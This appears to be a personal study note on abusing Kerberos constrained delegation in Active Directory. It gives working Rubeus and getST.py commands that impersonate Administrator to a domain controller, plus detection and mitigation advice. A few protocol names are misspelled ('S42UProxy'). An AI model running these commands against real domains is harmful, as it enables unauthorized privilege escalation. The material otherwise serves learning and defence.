---
tags:
  - AD
  - attack
date: 2023-09-1
---
- [[Constrained Delegation]] lets services impersonate users to specific services.
- Defined in the `msDS-AllowedToDelegate` attribute.
# How It Works

- User authenticates to service A.
- Service A requests a TGS to Service B on behalf of user.
	- done via `S4U2Self` and `S42UProxy`.
- DC checks service A is allowed to delegate to service B.
# Attack

Attackers must:

- have control over an account/computer configured for constrained delegation.
- object must be trusted to delegate to sensitive SPN.
- domain joined machine or user account with `SeTcbPrivilege` (trusted for delegation).
# Exploitation

- Windows:
	- create TGT as victim user:
		- `Rubeus.exe tgtdeleg`
	- request service ticket on behalf of victim:
		- `Rubeus.exe s4u /user:serviceuser /rc4:<hash> /impersonateuser:Administrator /msdsspn:cifs/dc.domain.local /ptt`
- Linux:
	- `getST.py -spn cifs/dc.domain.local -impersonate Administrator -hashes :<NTLM> domain/user`
# Detection

- Check for:
	- `Event ID 4769`  with `S42USelf` or `S4U2Proxy` indicators.
	- tickets issued for high priv users to low priv computers.
- Audit accounts with:
	- `Get-ADUser -Filter * -Properties msDS-AllowedToDelegateTo | Where { $_.'msDS-AllowedToDelegateTo' }`
# Mitigation

- Apply Principle of Least Privilege to delegation rights
- Limit what services are allowed in msDS-AllowedToDelegateTo
- Use [[Resource Based Delegation|Resource-Based Constrained Delegation (RBCD)]] instead, where possible
- Monitor for abuse using:
	- Kerberos auditing
	- SIEM alerting on unusual S4U2Proxy combinations